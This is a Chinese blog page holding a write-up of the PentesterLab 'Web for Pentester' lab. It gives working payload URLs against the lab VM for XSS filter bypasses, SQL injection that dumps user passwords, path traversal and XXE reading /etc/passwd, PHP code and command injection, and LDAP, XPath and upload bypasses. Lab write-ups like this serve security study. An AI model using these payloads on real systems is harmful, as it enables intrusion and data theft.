<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>Zebra0&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Zebra0's Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Zebra0's Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Zebra0's Blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="Zebra0&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xr0ty.com1.z0.glb.clouddn.com/images.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">Zebra0</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						
						<li>About</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/zebra0" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/u/5099617746" title="weibo">weibo</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				

				
				
				<section class="switch-part switch-part3">
				
					<div id="js-aboutme">爱民谣爱摇滚爱生活</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">Zebra0</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img lazy-src="http://7xr0ty.com1.z0.glb.clouddn.com/images.jpg" class="js-avatar">
			
			</div>
			<hgroup>
			  <h1 class="header-author">Zebra0</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/zebra0" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/u/5099617746" title="weibo">weibo</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
  
    <article id="post-web_for_pentester_i386 writeup" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/08/05/web_for_pentester_i386 writeup/" class="article-date">
  	<time datetime="2016-08-05T08:48:10.571Z" itemprop="datePublished">2016-08-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web-for-pentester-i386-writeup"><a href="#web-for-pentester-i386-writeup" class="headerlink" title="web_for_pentester_i386 writeup"></a>web_for_pentester_i386 writeup</h1><hr>
<p><a href="#1">PentesterLab</a><br>　<a href="#1.1">XSS</a><br>　　<a href="#1.1.1">Example 1</a><br>　　<a href="#1.1.2">Example 2</a><br>　　<a href="#1.1.3">Example 3</a><br>　　<a href="#1.1.4">Example 4</a><br>　　<a href="#1.1.5">Example 5</a><br>　　<a href="#1.1.6">Example 6</a><br>　　<a href="#1.1.7">Example 7</a><br>　　<a href="#1.1.8">Example 8</a><br>　　<a href="#1.1.9">Example 9</a><br>　<a href="#1.2">SQL injections</a><br>　　<a href="#1.2.1">Example 1</a><br>　　<a href="#1.2.2">Example 2</a><br>　　<a href="#1.2.3">Example 3</a><br>　　<a href="#1.2.4">Example 4</a><br>　　<a href="#1.2.5">Example 5</a><br>　　<a href="#1.2.6">Example 6</a><br>　　<a href="#1.2.7">Example 7</a><br>　　<a href="#1.2.8">Example 8</a><br>　　<a href="#1.2.9">Example 9</a><br>　<a href="#1.3">Directory traversal</a><br>　　<a href="#1.3.1">Example 1</a><br>　　<a href="#1.3.2">Example 2</a><br>　　<a href="#1.3.3">Example 3</a><br>　<a href="#1.4">File Include</a><br>　　<a href="#1.4.1">Example 1</a><br>　　<a href="#1.4.2">Example 2</a><br>　<a href="#1.5">Code injection</a><br>　　<a href="#1.5.1">Example 1</a><br>　　<a href="#1.5.2">Example 2</a><br>　　<a href="#1.5.3">Example 3</a><br>　　<a href="#1.5.4">Example 4</a><br>　<a href="#1.6">Commands injection</a><br>　　<a href="#1.6.1">Example 1</a><br>　　<a href="#1.6.2">Example 2</a><br>　　<a href="#1.6.3">Example 3</a><br>　<a href="#1.7">LDAP attacks</a><br>　　<a href="#1.7.1">Example 1</a><br>　　<a href="#1.7.2">Example 2</a><br>　<a href="#1.8">File Upload</a><br>　　<a href="#1.8.1">Example 1</a><br>　　<a href="#1.8.2">Example 2</a><br>　<a href="#1.9">XML attacks</a><br>　　<a href="#1.9.1">Example 1</a><br>　　<a href="#1.9.2">Example 2</a><br><span id="1.1"></span>　　</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><span id="1.1.1"></span></p>
<h3 id="Example1"><a href="#Example1" class="headerlink" title="Example1"></a>Example1</h3><p>根本没过滤，直接弹窗</p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></li>
</ul>
</blockquote>
<p><span id="1.1.2"></span></p>
<h3 id="Example2"><a href="#Example2" class="headerlink" title="Example2"></a>Example2</h3><p>过滤了全小写的script,换成全大写或者替换几个大写字母就可以弹窗</p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example2.php?name=%3CScript%3Ealert(1)%3C/sCript%3E</code></li>
</ul>
</blockquote>
<p><span id="1.1.3"></span></p>
<h3 id="Example3"><a href="#Example3" class="headerlink" title="Example3"></a>Example3</h3><p>可以在<code>scr</code> <code>ipt</code>中间插入一个<code>script</code>标签,因为过滤器只会过滤掉一个完整闭合的<code>script</code>标签，而过滤之后还会剩下一个完整闭合的<code>script</code>标签，也可以在<code>script</code>后面加个空格就好了</p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example3.php?name=%3CsCr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/scRipt%3EIpt%3E</code></li>
<li>payload:<code>http://192.168.47.128/xss/example3.php?name=%3CScript%20%3Ealert(1)%3C/sCript%20%3E</code></li>
</ul>
</blockquote>
<p><span id="1.1.4"></span></p>
<h3 id="Example4"><a href="#Example4" class="headerlink" title="Example4"></a>Example4</h3><p>script被过滤了,只要是有script就报错出error,换成<code>body</code>标签成功弹窗。这里说一下<code>body</code>标签,在<code>html</code>里面<code>body</code>标签有<code>onload</code>这个属性，<code>onload</code>事件会在页面或图像加载完成后立即发生。</p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example4.php?name=%3CBODY%20onload=%22alert(%271%27)%22%3E</code></li>
</ul>
</blockquote>
<p><span id="1.1.5"></span></p>
<h3 id="Example5"><a href="#Example5" class="headerlink" title="Example5"></a>Example5</h3><p>alert被过滤了,内心日狗,google了一下发现了<code>eval(String.fromCharCode())</code>,<code>String.fromCharCode</code>就是把ascii码转成字符串，然后<code>eval</code>就是把该字符串解析成javascript语句来执行,那思路就是把alert(1)转换成ascii码插到<code>String.fromCharCode()</code>里面。</p>
<blockquote>
<ul>
<li>paypload:<code>http://192.168.47.128/xss/example5.php?name=%3CsCript%20%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41));%3C/scrIpt%20%3E</code></li>
</ul>
</blockquote>
<p><span id="1.1.6"></span></p>
<h3 id="Example6"><a href="#Example6" class="headerlink" title="Example6"></a>Example6</h3><p><code>view-source:http://192.168.47.128/xss/example6.php?name=%3CsCript%20%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41));%3C/scrIpt%20%3E</code>发现这次是在script标签里面了，没过滤alert，还有个变量a，那就简单了,先闭合掉<code>&quot;;</code>然后写句<code>aler(1);</code>最后注释掉后面的<code>&quot;;</code>。</p>
<blockquote>
<ul>
<li>payloiad:<code>http://192.168.47.128/xss/example6.php?name=1%22;alert(1);//</code></li>
</ul>
</blockquote>
<p><span id="1.1.7"></span></p>
<h3 id="Example7"><a href="#Example7" class="headerlink" title="Example7"></a>Example7</h3><p>跟6区别就是<code>&quot;</code>变成了<code>&#39;</code></p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example7.php?name=1%27;alert(1);//</code></li>
</ul>
</blockquote>
<p><span id="1.1.8"></span></p>
<h3 id="Example8"><a href="#Example8" class="headerlink" title="Example8"></a>Example8</h3><p>变成了post,而且<code>&lt;&gt;</code>被HTMLEncode了,并不知道如何绕过,还是google救我,post地址使用了当前url，而且输入的地址是可以插入<code>action</code>属性里面的，那么思路就是闭合掉<code>form</code>标签然后添加<code>script</code>标签。</p>
<p><img src="http://7xr0ty.com1.z0.glb.clouddn.com/3.PNG" alt=""><br><img src="http://7xr0ty.com1.z0.glb.clouddn.com/1.PNG" alt=""></p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example8.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E</code></li>
</ul>
</blockquote>
<p><span id="1.1.9"></span></p>
<h3 id="Example9"><a href="#Example9" class="headerlink" title="Example9"></a>Example9</h3><p><code>location.hash.substring(1)</code>获取<code>#</code>后的东西,然后<code>document.write</code>输出到界面上，随便试了下<code>script</code>标签结果发下被urlencode了，搞了半天都没成，最后发现这题还跟浏览器有关系，firefox会自动urlencode，chrome可以。</p>
<blockquote>
<ul>
<li>payload:<code>http://192.168.47.128/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</blockquote>
<p><span id="1.2"></span>　　</p>
<h2 id="SQL-injections"><a href="#SQL-injections" class="headerlink" title="SQL injections"></a>SQL injections</h2><p><span id="1.2.1"></span></p>
<h3 id="Example1-1"><a href="#Example1-1" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>爆列数:<code>http://192.168.47.128/sqli/example1.php?name=root%27%20order%20by%206--+</code>第一次失败，所以列数是6</li>
<li>爆库名:<code>http://192.168.47.128/sqli/example1.php?name=root%27%20union%20all%20select%201,user(),database(),5,6%20--+</code><br>user:pentesterlab@localhost  数据库:exercises</li>
<li>爆表名:<code>http://192.168.47.128/sqli/example1.php?name=root%27%20union%20all%20select%201,table_name,database(),5,6%20from%20information_schema.tables%20where%20table_schema%20=%27exercises%27--+</code><br>表名:users</li>
<li>爆字段:<code>http://192.168.47.128/sqli/example1.php?name=root%27%20union%20all%20select%201,column_name,4,5,6%20from%20information_schema.columns%20where%20table_name=%27users%27--+</code><br>字段:id name age groupip passwd</li>
<li>爆内容:<code>http://192.168.47.128/sqli/example1.php?name=root%27%20union%20all%20select%20concat(id,%27$%27,name,%27$%27,age,%27$%27,groupid,%27$%27,passwd),2,3,4,5%20from%20users--+</code><br>完工</li>
</ul>
</blockquote>
<p><span id="1.2.2"></span></p>
<h3 id="Example2-1"><a href="#Example2-1" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>提示<code>error no space</code>过滤了空格,用注释法把空格换成<code>/**/</code>,还是失败,一脸懵逼后发现后面的<code>--+</code>,mdzz,换成<code>#</code>还是失败，<code>%23</code>绕过成功。</li>
<li><code>http://192.168.47.128/sqli/example2.php?name=root%27/**/union/**/all/**/select/**/concat(id,%27$%27,name,%27$%27,age,%27$%27,groupid,%27$%27,passwd),2,3,4,5/**/from/**/users%23</code></li>
</ul>
</blockquote>
<p><span id="1.2.3"></span></p>
<h3 id="Example3-1"><a href="#Example3-1" class="headerlink" title="Example3"></a>Example3</h3><blockquote>
<ul>
<li>payload跟2一样,看了源码后发现过滤还是升级了,<code>/ /</code>升级为<code>/\s+/</code>,从匹配空格到匹配多个不可见字符，包括空格、制表符、换页符等等。</li>
</ul>
</blockquote>
<p><span id="1.2.4"></span></p>
<h3 id="Example4-1"><a href="#Example4-1" class="headerlink" title="Example4"></a>Example4</h3><blockquote>
<ul>
<li><code>name</code>变成了<code>id</code>,应该是数字型注入,试下</li>
<li><code>http://192.168.47.128/sqli/example4.php?id=2%20or%201=1</code>返回了表中所有的行</li>
<li><code>http://192.168.47.128/sqli/example4.php?id=2%20and%201=2</code>失败</li>
<li>确认了是数字型的但是在爆内容的时候出现问题了,没回显,发现是<code>&#39;&#39;</code>被过滤掉了,没法用符号区分内容了,直接换成<code>7777</code>区分内容,看了学长的wp发现可以用16进制来代替分割内容时用的<code>&#39;$&#39;</code>。。。(还是看字符舒服</li>
<li><code>http://192.168.47.128/sqli/example4.php?id=2%20/**/union/**/all/**/select/**/concat(name,7777,id,7777,age,7777,groupid,7777,passwd),2,3,4,5/**/from/**/users%23</code></li>
</ul>
</blockquote>
<p><span id="1.2.5"></span></p>
<h3 id="Example5-1"><a href="#Example5-1" class="headerlink" title="Example5"></a>Example5</h3><blockquote>
<ul>
<li>还是4的payload,不知道哪升级了,看了源码是<code>/^[0-9]+/</code>，升级成了开头必须是正整数。</li>
</ul>
</blockquote>
<p><span id="1.2.6"></span></p>
<h3 id="Example6-1"><a href="#Example6-1" class="headerlink" title="Example6"></a>Example6</h3><blockquote>
<ul>
<li>一开始试了好久并不知道到底匹配的啥,看了源码知道了匹配的是末尾有数字,缺乏灵性啊。</li>
<li><code>http://192.168.47.128/sqli/example6.php?id=2%20/**/union/**/all/**/select/**/concat(name,7777,id,7777,age,7777,groupid,7777,passwd),2,3,4,5/**/from/**/users%231</code></li>
</ul>
</blockquote>
<p><span id="1.2.7"></span></p>
<h3 id="Example7-1"><a href="#Example7-1" class="headerlink" title="Example7"></a>Example7</h3><blockquote>
<ul>
<li>6的payload不行了,试了半天都gg了,于是看了源码<code>/^-?[0-9]+$/m</code>,在6的基础上开始匹配多行,也就是只要使一行满足正则表达式即可，那就在1后加个<code>%0A</code>。</li>
<li><code>http://192.168.47.128/sqli/example7.php?id=1%0Aunion/**/all/**/select/**/concat(name,7777,id,7777,age,7777,groupid,7777,passwd),2,3,4,5/**/from/**/users%23</code></li>
</ul>
</blockquote>
<p><span id="1.2.8"></span></p>
<h3 id="Example8-1"><a href="#Example8-1" class="headerlink" title="Example8"></a>Example8</h3><blockquote>
<ul>
<li>注入点发生了变化,变成了<code>order by</code>后面的位置,那就不能用<code>union select</code>了,布尔盲注和时间盲注都试试,最后白盒了发现有个反引号`。</li>
<li><a href="http://192.168.47.128/sqli/example8.php?order=name`,(select%20sleep(5)%20from%20users%20where%20ascii(substr(name,1,1))=97)%23" target="_blank" rel="external">http://192.168.47.128/sqli/example8.php?order=name`,(select%20sleep(5)%20from%20users%20where%20ascii(substr(name,1,1))=97)%23</a></li>
<li>py还不会写脚本,等学完补下脚本</li>
</ul>
</blockquote>
<p><span id="1.2.9"></span></p>
<h3 id="Example9-1"><a href="#Example9-1" class="headerlink" title="Example9"></a>Example9</h3><blockquote>
<ul>
<li><code>http://192.168.47.128/sqli/example9.php?order=name%20DESC</code> name变成了降序,说明<code>order by</code>的后面没有反引号注释了,所以去掉反引号即可。</li>
<li><code>http://192.168.47.128/sqli/example9.php?order=name,(select%20sleep(1)%20from%20users%20where%20ascii(substr(name,1,1))=97)%23</code></li>
</ul>
</blockquote>
<p><span id="1.3"></span></p>
<h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><p>必须要吐槽下,这个Directory traversal系列在首页居然没链接</p>
<p><span id="1.3.1"></span></p>
<h3 id="Example1-2"><a href="#Example1-2" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>相对路径试下。</li>
<li><code>http://192.168.47.128/dirtrav/example1.php?file=../../../etc/passwd</code></li>
</ul>
</blockquote>
<p><span id="1.3.2"></span></p>
<h3 id="Example2-2"><a href="#Example2-2" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>加了过滤 <code>/var/www/files</code></li>
<li><code>http://192.168.47.128/dirtrav/example2.php?file=/var/www/files/../../../etc/passwd</code></li>
</ul>
</blockquote>
<p><span id="1.3.3"></span></p>
<h3 id="Example3-2"><a href="#Example3-2" class="headerlink" title="Example3"></a>Example3</h3><blockquote>
<ul>
<li>上了正则表达式<code>/\x00.*/</code>,用%00截断后面的<code>.png</code>就好</li>
<li><code>192.168.47.128/dirtrav/example3.php?file=../../../etc/passwd%00</code></li>
</ul>
</blockquote>
<p><span id="1.4"></span></p>
<h2 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h2><p><span id="1.4.1"></span></p>
<h3 id="Example1-3"><a href="#Example1-3" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>感觉文件包含跟目录遍历差不多啊。。。大雾</li>
<li><code>http://192.168.47.128/fileincl/example1.php?page=../../../../etc/passwd</code></li>
</ul>
</blockquote>
<p><span id="1.4.2"></span></p>
<h3 id="Example2-3"><a href="#Example2-3" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>少了<code>.php</code>,<code>%00</code>bypass</li>
<li><code>http://192.168.47.128/fileincl/example2.php?page=../../../../etc/passwd%00</code></li>
</ul>
</blockquote>
<p><span id="1.5"></span></p>
<h2 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h2><p><span id="1.5.1"></span></p>
<h3 id="Example1-4"><a href="#Example1-4" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>没啥过滤两边闭合下就bybass了。</li>
<li><code>http://192.168.47.128/codeexec/example1.php?name=%22;phpinfo();//</code></li>
</ul>
</blockquote>
<p><span id="1.5.2"></span></p>
<h3 id="Example2-4"><a href="#Example2-4" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>发现跟sqli的那个差不多,也是排序变了,看了源码发现是用了<code>usort</code>,然后有个<code>create_function</code>然后是在<code>($a-&gt;&#39;.$order.&#39;</code>这个位置有不可控的因素,闭合掉前面的<code>{(</code>,后面的注释掉就bypass了。</li>
<li><code>http://192.168.47.128/codeexec/example2.php?order=age);}phpinfo();//</code></li>
</ul>
</blockquote>
<p><span id="1.5.3"></span></p>
<h3 id="Example3-3"><a href="#Example3-3" class="headerlink" title="Example3"></a>Example3</h3><blockquote>
<ul>
<li>随便试了下报错了,<code>preg_replace()</code>,这个函数是执行一个正则表达式的搜索和替换</li>
<li>原型是<code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code>作用是搜索subject中匹配pattern的部分,以replacement进行替换,就这个题来说就是<code>pattern</code>是正则,<code>base</code>是最开始的字符串,<code>new</code>则是符合正则的字符会被替代成的东西。关键是文档中的这么一句话:<br>pattern 要搜索的模式。可以使一个字符串或字符串数组。可以使用一些PCRE修饰符,包括被弃用的’e’(PREG_REPLACE_EVAL)，可以为这个函数指定。</li>
<li>那这个e模式是什么呢:<br>如果设置了e这个被弃用的修饰符， preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线()和 NULL 字符在 后向引用替换时会被用反斜线转义。</li>
<li>于是payload就出来了</li>
<li><code>http://192.168.47.128/codeexec/example3.php?new=phpinfo();&amp;pattern=//e&amp;base=</code></li>
</ul>
</blockquote>
<p><span id="1.5.4"></span></p>
<h3 id="Example4-2"><a href="#Example4-2" class="headerlink" title="Example4"></a>Example4</h3><blockquote>
<ul>
<li>还是先实现单双引号,结果报错出现了这个函数<code>assert()</code>,查了下发现函数原型是<code>bool assert ( mixed $assertion [, Throwable $exception ] )</code> assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。重点还是在后面,<code>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</code>那开始试呗</li>
<li>经过一段漫长的时间,我还是看了源码,结果居然中间有个连接符,无情</li>
<li><code>http://192.168.47.128/codeexec/example4.php?name=hacke%27.phpinfo();//</code></li>
</ul>
</blockquote>
<p><span id="1.6"></span></p>
<h2 id="Commands-injection"><a href="#Commands-injection" class="headerlink" title="Commands injection"></a>Commands injection</h2><p><span id="1.6.1"></span></p>
<h3 id="Example1-5"><a href="#Example1-5" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>上了个管道符就过了</li>
<li><code>http://192.168.47.128/commandexec/example1.php?ip=127.0.0.1|ls</code></li>
</ul>
</blockquote>
<p><span id="1.6.2"></span></p>
<h3 id="Example2-5"><a href="#Example2-5" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>ip地址不对的话会提示Invalid IP address,试了很久<code>%0a</code>bypass了,果然前面的坑没有白踩的。</li>
<li><code>http://192.168.47.128/commandexec/example2.php?ip=127.0.0.1%0Als</code></li>
</ul>
</blockquote>
<p><span id="1.6.3"></span></p>
<h3 id="Example3-4"><a href="#Example3-4" class="headerlink" title="Example3"></a>Example3</h3><blockquote>
<ul>
<li>不会,看了源码也不会,感觉正则根本过不去啊,而且重定向了,只能看别人的wp了</li>
<li>简单说下就是php文件运行过程中如果碰到有header(“Location:某个页面URL”);这种语句，会直接跳转到另一个页面，但是这里的跳转并没有影响当前php文件的继续执行。也就是是说php header跳转之后，当前页面的脚本会继续执行。如果需要终止脚本运行，需要加exit()或者die(),而源码中并没有exit(),过滤也没升级,所以抓包，curl都行。</li>
<li><code>curl &quot;http://192.168.37.145/commandexec/example3.php?ip=127.0.0.1%0als&quot;</code></li>
<li>因为我是win下做的,所以用fiddler发了个包,也可以抓到<br><img src="http://7xr0ty.com1.z0.glb.clouddn.com/4.PNG" alt=""></li>
</ul>
</blockquote>
<p><span id="1.7"></span></p>
<h2 id="LDAP-attacks"><a href="#LDAP-attacks" class="headerlink" title="LDAP attacks"></a>LDAP attacks</h2><p><span id="1.7.1"></span></p>
<h3 id="Example1-6"><a href="#Example1-6" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>试了试删了后面的参数就莫名其妙地进去了</li>
<li>Google了下原理应该是php中<code>ldap_bind</code>这个函数会在没有指定 <code>bind_rnd</code>和<code>bind_password</code>，将会以匿名身份绑定。</li>
</ul>
</blockquote>
<p><span id="1.7.2"></span></p>
<h3 id="Example2-6"><a href="#Example2-6" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>这个要先学习一下ldap的语法,ldap查询里面有个符号叫通配符<code>*</code>,<code>可使用通配符表示值可以等于任何值。</code>也就是可以使用通配符来匹配了一些相同的值</li>
<li><code>http://192.168.47.128/ldap/example2.php?name=ha*&amp;password=hacker</code></li>
<li>还有其他的绕过思路,也是通过闭合前面的ldap的查询注释掉后面的来</li>
<li>猜测后台是<code>(&amp;(name=$_GET[&#39;name&#39;])(password=hash($_GET[&#39;password&#39;])))</code></li>
<li><code>http://192.168.47.128/ldap/example2.php?name=hacker))%00</code></li>
</ul>
</blockquote>
<p><span id="1.8"></span></p>
<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p><span id="1.8.1"></span></p>
<h3 id="Example1-7"><a href="#Example1-7" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>没过滤可以直接传文件</li>
</ul>
</blockquote>
<p><span id="1.8.2"></span></p>
<h3 id="Example2-7"><a href="#Example2-7" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>过滤了<code>.php</code></li>
<li>可以把<code>.php</code>改成<code>.php3</code>,还可以加一些Apache不认识的后缀名来绕过例如<code>.php.blah</code> <code>.php.fuck</code>,不影响解析可以执行脚本,至于什么后缀名你开心就好</li>
</ul>
</blockquote>
<p><span id="1.9"></span></p>
<h2 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h2><p><span id="1.9.1"></span></p>
<h3 id="Example1-8"><a href="#Example1-8" class="headerlink" title="Example1"></a>Example1</h3><blockquote>
<ul>
<li>学习了一发xml语法跟xee,地址是<a href="http://www.w3school.com.cn/xml/xml_syntax.asp" target="_blank" rel="external">w3c</a>跟<a href="https://www.91ri.org/9539.html" target="_blank" rel="external">XEE攻击注入与防御</a></li>
<li>payload:<code>http://192.168.47.128/xml/example1.php?xml=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+xml+%5b%3c!ENTITY+xmla+SYSTEM+%22file%3a%2f%2f%2fetc%2fpasswd%22+%3e%5d%3e%3cp%3e%26xmla%3b%3c%2fp%3e</code></li>
<li><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xml [&lt;!ENTITY xmla SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;p&gt;&amp;xmla;&lt;/p&gt;</code>要用url编码后加到xml=后面</li>
</ul>
</blockquote>
<p><span id="1.9.2"></span></p>
<h3 id="Example2-8"><a href="#Example2-8" class="headerlink" title="Example2"></a>Example2</h3><blockquote>
<ul>
<li>使用上一题的payload结果没回显那肯定不是xee了,可能是blind xee,或者是xpath</li>
<li>还是单引号大法,果然报错<code>xpath()</code>那就搜下xpath注入</li>
<li><code>http://192.168.47.128/xml/example2.php?name=hacker%27]%20|%20//*%00</code></li>
<li><code>hacker&#39;] | //*%00</code> 前面还是闭合后面还是截断,在上述表达式中，<code>|</code>用于表示或操作，<code>//</code>表示从匹配选择的当前节点选择文档中的节点,而不考虑它们的位置,<code>*</code>表示匹配任何元素节点,所以<code>//*</code>代表所有节点,所以会返回在这个xml中的所有节点。</li>
</ul>
</blockquote>
<h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>加起来算是2天的时间通关了pentesterlab，虽然还是菜的不行，但是学到了很多，继续努力。附上两位菊苣的wp，<a href="http://lazysheep.cc/2016/03/21/0x15/#SQLI" target="_blank" rel="external">Hcamael菊苣的wp</a>，<a href="https://lightless.me/archives/web-for-pentest-writeup.html" target="_blank" rel="external">lightless菊苣的wp</a>。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-CTFGAME_week1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/08/05/CTFGAME_week1/" class="article-date">
  	<time datetime="2016-08-05T08:48:10.567Z" itemprop="datePublished">2016-08-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CTFGAME-week1"><a href="#CTFGAME-week1" class="headerlink" title="CTFGAME_week1"></a>CTFGAME_week1</h1><hr>
<p>过了week1感觉需要多看书了，还有不会python的话会很惨。</p>
<h2 id="WEB从0开始之PHP代码审计0"><a href="#WEB从0开始之PHP代码审计0" class="headerlink" title="WEB从0开始之PHP代码审计0"></a>WEB从0开始之PHP代码审计0</h2>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        <p class="article-more-link">
          <a  href="/2016/08/05/CTFGAME_week1/#more">more >></a>
        </p>
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-CTFGAME-week0" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/08/05/CTFGAME-week0/" class="article-date">
  	<time datetime="2016-08-05T08:48:10.558Z" itemprop="datePublished">2016-08-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CTFGAME-week0"><a href="#CTFGAME-week0" class="headerlink" title="CTFGAME-week0"></a>CTFGAME-week0</h1><hr>
<p> 说起来week0的感想大概是：</p>
<blockquote>
<ul>
<li>用好google
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        <p class="article-more-link">
          <a  href="/2016/08/05/CTFGAME-week0/#more">more >></a>
        </p>
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 Zebra0
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
